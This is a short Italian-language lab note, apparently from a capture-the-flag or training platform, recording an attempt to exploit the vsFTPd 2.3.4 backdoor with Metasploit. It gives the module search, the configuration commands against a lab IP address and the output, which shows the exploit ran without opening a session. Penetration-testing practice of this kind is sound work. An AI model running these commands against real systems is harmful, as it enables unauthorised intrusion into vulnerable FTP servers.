## 🧨 Exploit: vsFTPd 2.3.4 Backdoor

### 🔎 Comando iniziale in Metasploit
```bash
msfconsole
msf6 > search vsftpd

## 📋 Moduli trovati

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

## 🚀 Configurazione exploit

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.129.151.196
set RPORT 21
set PAYLOAD cmd/unix/interact
run

## 📤 Output finale

[*] 10.129.151.196:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.151.196:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.

❌ Risultato: L'exploit è stato eseguito, ma non ha generato una sessione attiva.





